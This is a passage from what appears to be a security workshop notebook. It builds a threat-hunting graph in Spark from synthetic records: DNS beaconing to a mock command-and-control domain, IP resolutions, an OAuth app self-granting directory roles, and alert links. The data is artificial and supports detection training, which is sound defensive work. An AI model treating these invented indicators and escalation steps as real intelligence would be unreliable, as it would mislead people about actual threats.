    ("dev-001", "c2-beacon.xyz",             "dev-001_c2-beacon.xyz",             "QueriedDomain", "288", "300", "0.08", "2026-01-10T09:00:00Z", "2026-01-10T23:00:00Z"),
    ("dev-001", "a3f7b2c1.c2-beacon.xyz",    "dev-001_a3f7b2c1.c2-beacon.xyz",    "QueriedDomain", "12",  "300", "0.07", "2026-01-10T09:05:00Z", "2026-01-10T10:05:00Z"),
    ("dev-001", "d9e1a4f8.c2-beacon.xyz",    "dev-001_d9e1a4f8.c2-beacon.xyz",    "QueriedDomain", "12",  "300", "0.09", "2026-01-10T10:10:00Z", "2026-01-10T11:10:00Z"),
    ("dev-001", "b5c6d7e2.c2-beacon.xyz",    "dev-001_b5c6d7e2.c2-beacon.xyz",    "QueriedDomain", "12",  "300", "0.08", "2026-01-10T11:15:00Z", "2026-01-10T12:15:00Z"),
    # Jump server also beaconing
    ("dev-005", "update-svc.ddns.net",        "dev-005_update-svc.ddns.net",        "QueriedDomain", "144", "600", "0.05", "2026-01-10T09:50:00Z", "2026-01-10T23:00:00Z"),
    # Normal DNS traffic for contrast
    ("dev-001", "microsoft.com",              "dev-001_microsoft.com",              "QueriedDomain", "45",  "800", "1.80", "2026-01-10T07:00:00Z", "2026-01-10T17:00:00Z"),
    ("dev-002", "azure.com",                  "dev-002_azure.com",                  "QueriedDomain", "22",  "1200","2.10", "2026-01-10T08:00:00Z", "2026-01-10T18:00:00Z"),
]
dns_query_df = spark.createDataFrame(dns_rows, dns_query_schema)

# ResolvesTo: Domain -> IP
resolves_schema = StructType([
    StructField("DomainName",  StringType(), True),
    StructField("IPAddress",   StringType(), True),
    StructField("EdgeKey",     StringType(), True),
    StructField("edgeType",    StringType(), True),
])
resolves_rows = [
    ("c2-beacon.xyz",                 "185.220.101.45", "c2-beacon.xyz_185.220.101.45",                 "ResolvesTo"),
    ("a3f7b2c1.c2-beacon.xyz",        "185.220.101.45", "a3f7b2c1.c2-beacon.xyz_185.220.101.45",        "ResolvesTo"),
    ("d9e1a4f8.c2-beacon.xyz",        "185.220.101.45", "d9e1a4f8.c2-beacon.xyz_185.220.101.45",        "ResolvesTo"),
    ("b5c6d7e2.c2-beacon.xyz",        "185.220.101.45", "b5c6d7e2.c2-beacon.xyz_185.220.101.45",        "ResolvesTo"),
    ("update-svc.ddns.net",            "91.108.4.0",     "update-svc.ddns.net_91.108.4.0",               "ResolvesTo"),
    ("api.zava-private-invoices.net",  "185.220.101.45", "api.zava-private-invoices.net_185.220.101.45", "ResolvesTo"),
    ("microsoft.com",                  "52.168.0.1",     "microsoft.com_52.168.0.1",                     "ResolvesTo"),
    ("azure.com",                      "52.168.0.1",     "azure.com_52.168.0.1",                         "ResolvesTo"),
]
resolves_df = spark.createDataFrame(resolves_rows, resolves_schema)

print(f"QueriedDomain edges: {dns_query_df.count()}")
print(f"ResolvesTo edges: {resolves_df.count()}")

In [ ]:
# =============================================================================
# Cell 24: Edges — OAuth / Service Principal relationships
# =============================================================================

# OwnsApp: User -> ServicePrincipal
owns_schema = StructType([
    StructField("UserId",   StringType(), True),
    StructField("SpId",     StringType(), True),
    StructField("EdgeKey",  StringType(), True),
    StructField("edgeType", StringType(), True),
    StructField("AddedDate",StringType(), True),
])
owns_rows = [
    ("user-alice",   "sp-001", "user-alice_sp-001",   "OwnsApp", "2026-01-05"),  # Alice (compromised) owns attacker app
    ("user-bob",     "sp-002", "user-bob_sp-002",     "OwnsApp", "2025-06-01"),
    ("user-atk-01",  "sp-003", "user-atk-01_sp-003",  "OwnsApp", "2026-01-08"),  # attacker owns external connector
    ("user-grace",   "sp-005", "user-grace_sp-005",   "OwnsApp", "2024-03-15"),
]
owns_df = spark.createDataFrame(owns_rows, owns_schema)

# HasPermission: ServicePrincipal -> AppPermission
hasperm_schema = StructType([
    StructField("SpId",         StringType(), True),
    StructField("PermissionId", StringType(), True),
    StructField("EdgeKey",      StringType(), True),
    StructField("edgeType",     StringType(), True),
    StructField("GrantedDate",  StringType(), True),
    StructField("GrantedBy",    StringType(), True),
])
hasperm_rows = [
    # ZavaPrivateHelperApp starts with dangerous seed permission
    ("sp-001", "perm-001", "sp-001_perm-001", "HasPermission", "2026-01-05", "user-alice"),  # AppRoleAssignment.ReadWrite.All
    # ZavaPrivateHelperApp self-grants RoleManagement.ReadWrite.Directory (CVE-2025-55241)
    ("sp-001", "perm-002", "sp-001_perm-002", "HasPermission", "2026-01-10", "sp-001"),      # self-granted!
    ("sp-001", "perm-003", "sp-001_perm-003", "HasPermission", "2026-01-10", "sp-001"),      # User.ReadWrite.All
    ("sp-001", "perm-004", "sp-001_perm-004", "HasPermission", "2026-01-10", "sp-001"),      # Mail.ReadWrite
    # ExternalAuditConnector also holds dangerous perms
    ("sp-003", "perm-001", "sp-003_perm-001", "HasPermission", "2026-01-08", "user-atk-01"),
    ("sp-003", "perm-005", "sp-003_perm-005", "HasPermission", "2026-01-10", "sp-001"),      # granted by ZavaPrivateHelperApp
    # Legitimate: DataSyncService has audit read only
    ("sp-002", "perm-006", "sp-002_perm-006", "HasPermission", "2025-06-01", "user-bob"),
    ("sp-004", "perm-007", "sp-004_perm-007", "HasPermission", "2020-01-01", "user-bob"),
]
hasperm_df = spark.createDataFrame(hasperm_rows, hasperm_schema)

# GrantedPermissionTo: ServicePrincipal -> ServicePrincipal (sp-001 escalates sp-003)
grantedto_schema = StructType([
    StructField("SourceSpId",   StringType(), True),
    StructField("TargetSpId",   StringType(), True),
    StructField("EdgeKey",      StringType(), True),
    StructField("edgeType",     StringType(), True),
    StructField("Permission",   StringType(), True),
    StructField("GrantedDate",  StringType(), True),
])
grantedto_rows = [
    ("sp-001", "sp-003", "sp-001_sp-003", "GrantedPermissionTo", "Directory.ReadWrite.All", "2026-01-10T10:20:00Z"),
    ("sp-001", "sp-001", "sp-001_sp-001", "GrantedPermissionTo", "RoleManagement.ReadWrite.Directory", "2026-01-10T10:15:00Z"),  # self-grant
]
grantedto_df = spark.createDataFrame(grantedto_rows, grantedto_schema)

print(f"OwnsApp edges: {owns_df.count()}")
print(f"HasPermission edges: {hasperm_df.count()}")
print(f"GrantedPermissionTo edges: {grantedto_df.count()}")

In [ ]:
# =============================================================================
# Cell 25: Edges — Alert relationships
# =============================================================================

# TriggeredAlert: User -> Alert
user_alert_schema = StructType([
    StructField("UserId",   StringType(), True),
    StructField("AlertId",  StringType(), True),
    StructField("EdgeKey",  StringType(), True),
    StructField("edgeType", StringType(), True),
])
user_alert_rows = [
    ("user-alice",  "alert-001", "user-alice_alert-001",  "TriggeredAlert"),
    ("user-alice",  "alert-002", "user-alice_alert-002",  "TriggeredAlert"),
    ("user-alice",  "alert-003", "user-alice_alert-003",  "TriggeredAlert"),
    ("user-alice",  "alert-004", "user-alice_alert-004",  "TriggeredAlert"),
    ("user-alice",  "alert-005", "user-alice_alert-005",  "TriggeredAlert"),
    ("user-eve",    "alert-001", "user-eve_alert-001",    "TriggeredAlert"),
    ("user-eve",    "alert-002", "user-eve_alert-002",    "TriggeredAlert"),
    ("user-alice",  "alert-006", "user-alice_alert-006",  "TriggeredAlert"),
    ("user-alice",  "alert-007", "user-alice_alert-007",  "TriggeredAlert"),
    ("user-atk-01", "alert-008", "user-atk-01_alert-008", "TriggeredAlert"),
    ("user-alice",  "alert-009", "user-alice_alert-009",  "TriggeredAlert"),
]
user_alert_df = spark.createDataFrame(user_alert_rows, user_alert_schema)

# DeviceAlert: Device -> Alert
device_alert_schema = StructType([
    StructField("DeviceId",  StringType(), True),
    StructField("AlertId",   StringType(), True),
    StructField("EdgeKey",   StringType(), True),
    StructField("edgeType",  StringType(), True),
])
device_alert_rows = [
    ("dev-001", "alert-002", "dev-001_alert-002", "DeviceAlert"),
    ("dev-001", "alert-003", "dev-001_alert-003", "DeviceAlert"),
    ("dev-001", "alert-004", "dev-001_alert-004", "DeviceAlert"),
    ("dev-005", "alert-006", "dev-005_alert-006", "DeviceAlert"),
    ("dev-005", "alert-007", "dev-005_alert-007", "DeviceAlert"),
    ("dev-001", "alert-009", "dev-001_alert-009", "DeviceAlert"),
    ("dev-005", "alert-009", "dev-005_alert-009", "DeviceAlert"),
]
device_alert_df = spark.createDataFrame(device_alert_rows, device_alert_schema)

print(f"TriggeredAlert edges: {user_alert_df.count()}")
print(f"DeviceAlert edges: {device_alert_df.count()}")

## Section G — Build Graph with GraphSpecBuilder

All nodes and edges are registered with the builder. Key alignment:
- Edge source `id_column` must contain values that **exactly match** the target node's `key=` column.
- Example: `SignedInFrom` source=UserId must match User node `key="UserId"`; target=IPAddress must match IP node `key="IPAddress"`.

In [ ]:
# =============================================================================
# Cell 27: GraphSpecBuilder — Register All Nodes & Edges
# =============================================================================

graph = (
    GraphSpecBuilder.start()

    # -- NODES ----------------------------------------------------------------

    .add_node("User")
    .from_dataframe(user_df)
    .with_columns(
        "UserId", "UserPrincipalName", "DisplayName", "Department",
        "JobTitle", "RiskLevel", "AccountEnabled", "nodeType",
        key="UserId", display="UserPrincipalName"
    )

    .add_node("Device")
    .from_dataframe(device_df)
    .with_columns(
        "DeviceId", "DeviceName", "OSPlatform", "ExposureLevel",
        "DeviceType", "IsCompromised", "nodeType",
        key="DeviceId", display="DeviceName"
    )

    .add_node("Email")
    .from_dataframe(email_df)
    .with_columns(
        "EmailId", "Subject", "SenderAddress", "RecipientAddress",
        "DeliveryAction", "ThreatTypes", "TimeGenerated", "nodeType",
        key="EmailId", display="Subject"
    )

    .add_node("Url")
    .from_dataframe(url_df)
    .with_columns(
        "UrlId", "Url", "Verdict", "ThreatType", "DomainAge", "nodeType",
        key="UrlId", display="Url"
    )

    .add_node("Process")
    .from_dataframe(process_df)
    .with_columns(
        "ProcessId", "FileName", "CommandLine", "SHA256", "IsLolBin",
        "Technique", "TimeGenerated", "nodeType",
        key="ProcessId", display="FileName"
    )

    .add_node("IP")
    .from_dataframe(ip_df)
    .with_columns(
        "IPAddress", "IPType", "ASN", "Country", "IsTorExit", "ThreatIntel", "nodeType",
        key="IPAddress", display="IPAddress"
    )

    .add_node("Domain")
    .from_dataframe(domain_df)
    .with_columns(
        "DomainName", "DomainType", "IsMalicious", "Registrar", "DomainAge", "nodeType",
        key="DomainName", display="DomainName"
    )

    .add_node("ServicePrincipal")
    .from_dataframe(sp_df)
    .with_columns(
        "SpId", "SpName", "SpType", "IsThirdParty", "RiskLevel", "CreatedDate", "nodeType",
        key="SpId", display="SpName"
    )

    .add_node("AppPermission")
    .from_dataframe(perm_df)
    .with_columns(
        "PermissionId", "PermissionName", "Scope", "RiskRating", "IsTierZero", "nodeType",
        key="PermissionId", display="PermissionName"
    )

    .add_node("Alert")
    .from_dataframe(alert_df)
    .with_columns(
        "AlertId", "AlertName", "Severity", "Tactic", "Technique", "Status", "TimeGenerated", "nodeType",
        key="AlertId", display="AlertName"
    )

    # -- EDGES ----------------------------------------------------------------

    .add_edge("ReceivedEmail")
    .from_dataframe(received_email_df)
    .source(id_column="UserId",  node_type="User")
    .target(id_column="EmailId", node_type="Email")
    .with_columns("EdgeKey", "edgeType", key="EdgeKey", display="edgeType")

    .add_edge("SentEmail")
    .from_dataframe(sent_email_df)
    .source(id_column="UserId",  node_type="User")
    .target(id_column="EmailId", node_type="Email")
    .with_columns("EdgeKey", "edgeType", key="EdgeKey", display="edgeType")

    .add_edge("ContainsUrl")
    .from_dataframe(contains_url_df)
    .source(id_column="EmailId", node_type="Email")
    .target(id_column="UrlId",   node_type="Url")
    .with_columns("EdgeKey", "edgeType", key="EdgeKey", display="edgeType")

    .add_edge("ClickedUrl")
    .from_dataframe(clicked_url_df)
    .source(id_column="UserId", node_type="User")
    .target(id_column="UrlId",  node_type="Url")
    .with_columns("EdgeKey", "edgeType", "TimeClicked", key="EdgeKey", display="edgeType")

    .add_edge("SignedInFrom")
    .from_dataframe(signin_df)
    .source(id_column="UserId",     node_type="User")
    .target(id_column="IPAddress",  node_type="IP")
    .with_columns("EdgeKey", "edgeType", "SignInCount", "FirstSeen", "LastSeen", "IsRisky", key="EdgeKey", display="edgeType")

    .add_edge("LoggedInTo")
    .from_dataframe(logon_df)
    .source(id_column="UserId",   node_type="User")
    .target(id_column="DeviceId", node_type="Device")
    .with_columns("EdgeKey", "edgeType", "LogonType", "FirstSeen", "LastSeen", key="EdgeKey", display="edgeType")

    .add_edge("SpawnedProcess")
    .from_dataframe(spawned_df)
    .source(id_column="ParentProcessId", node_type="Process")
    .target(id_column="ChildProcessId",  node_type="Process")
    .with_columns("EdgeKey", "edgeType", "TimeGenerated", key="EdgeKey", display="edgeType")

    .add_edge("RanOn")
    .from_dataframe(ranon_df)
    .source(id_column="ProcessId", node_type="Process")
    .target(id_column="DeviceId",  node_type="Device")
    .with_columns("EdgeKey", "edgeType", key="EdgeKey", display="edgeType")

    .add_edge("RanAs")
    .from_dataframe(ranas_df)
    .source(id_column="ProcessId", node_type="Process")
    .target(id_column="UserId",    node_type="User")
    .with_columns("EdgeKey", "edgeType", key="EdgeKey", display="edgeType")

    .add_edge("QueriedDomain")
    .from_dataframe(dns_query_df)
    .source(id_column="DeviceId",   node_type="Device")
    .target(id_column="DomainName", node_type="Domain")
    .with_columns("EdgeKey", "edgeType", "QueryCount", "MeanIntervalSec", "CoeffVariation", "FirstSeen", "LastSeen", key="EdgeKey", display="edgeType")

    .add_edge("ResolvesTo")
    .from_dataframe(resolves_df)
    .source(id_column="DomainName", node_type="Domain")
    .target(id_column="IPAddress",  node_type="IP")
    .with_columns("EdgeKey", "edgeType", key="EdgeKey", display="edgeType")

    .add_edge("OwnsApp")
    .from_dataframe(owns_df)
    .source(id_column="UserId", node_type="User")
    .target(id_column="SpId",   node_type="ServicePrincipal")
    .with_columns("EdgeKey", "edgeType", "AddedDate", key="EdgeKey", display="edgeType")

    .add_edge("HasPermission")
    .from_dataframe(hasperm_df)
    .source(id_column="SpId",         node_type="ServicePrincipal")
    .target(id_column="PermissionId", node_type="AppPermission")
    .with_columns("EdgeKey", "edgeType", "GrantedDate", "GrantedBy", key="EdgeKey", display="edgeType")

    .add_edge("GrantedPermissionTo")
    .from_dataframe(grantedto_df)
    .source(id_column="SourceSpId", node_type="ServicePrincipal")
    .target(id_column="TargetSpId", node_type="ServicePrincipal")
    .with_columns("EdgeKey", "edgeType", "Permission", "GrantedDate", key="EdgeKey", display="edgeType")

    .add_edge("TriggeredAlert")
    .from_dataframe(user_alert_df)
    .source(id_column="UserId",  node_type="User")
    .target(id_column="AlertId", node_type="Alert")
    .with_columns("EdgeKey", "edgeType", key="EdgeKey", display="edgeType")

    .add_edge("DeviceAlert")
    .from_dataframe(device_alert_df)
    .source(id_column="DeviceId", node_type="Device")
    .target(id_column="AlertId",  node_type="Alert")
    .with_columns("EdgeKey", "edgeType", key="EdgeKey", display="edgeType")

).done()

graph.show_schema()

In [ ]:
# =============================================================================
# Cell 28: Build & Persist the Graph
# =============================================================================

build_result = graph.build_graph_with_data()
print("Build status:", build_result.get('status'))
print("Graph name: ", GRAPH_NAME)
print(build_result)

In [ ]:
# =============================================================================
# Cell 29: Post-Build Validation
# =============================================================================

node_counts = {
    "User":             user_df.count(),
    "Device":           device_df.count(),
    "Email":            email_df.count(),
    "Url":              url_df.count(),
    "Process":          process_df.count(),
    "IP":               ip_df.count(),
    "Domain":           domain_df.count(),
    "ServicePrincipal": sp_df.count(),
    "AppPermission":    perm_df.count(),
    "Alert":            alert_df.count(),
}

edge_counts = {
    "ReceivedEmail":      received_email_df.count(),
    "SentEmail":          sent_email_df.count(),
    "ContainsUrl":        contains_url_df.count(),
    "ClickedUrl":         clicked_url_df.count(),
    "SignedInFrom":       signin_df.count(),
    "LoggedInTo":         logon_df.count(),
    "SpawnedProcess":     spawned_df.count(),
    "RanOn":              ranon_df.count(),
    "RanAs":              ranas_df.count(),
    "QueriedDomain":      dns_query_df.count(),
    "ResolvesTo":         resolves_df.count(),
    "OwnsApp":            owns_df.count(),
    "HasPermission":      hasperm_df.count(),
    "GrantedPermissionTo":grantedto_df.count(),
    "TriggeredAlert":     user_alert_df.count(),
    "DeviceAlert":        device_alert_df.count(),
}

print("\n=== NODE COUNTS ===")
for ntype, cnt in node_counts.items():
    flag = " EMPTY" if cnt == 0 else ""
    print(f"  {ntype:22s}: {cnt:4d}{flag}")

print("\n=== EDGE COUNTS ===")
for etype, cnt in edge_counts.items():
    flag = " EMPTY" if cnt == 0 else ""
    print(f"  {etype:26s}: {cnt:4d}{flag}")

total_nodes = sum(node_counts.values())
total_edges = sum(edge_counts.values())
print(f"\nTOTAL: {total_nodes} nodes | {total_edges} edges")
print("\nGraph ready for GQL queries!")

## Next Steps

Once the graph is built and persisted, open the **`uber_workshop_graph_queries.md`** file for a full catalog of GQL queries organised by difficulty level:

| File | Contents |
|------|----------|
| `uber_workshop_graph_queries.md` | Beginner to Expert query catalog with explanations |
| `MASTER_DEMO_GUIDE.md` | Narrated workshop walkthrough |
| `README.md` | Graph schema reference |

### Quick start — try this query first

```gql
MATCH (u:User)-[:ReceivedEmail]->(e:Email)
WHERE e.ThreatTypes = 'Phish'
RETURN u.UserPrincipalName AS Victim, e.Subject AS PhishingEmail
```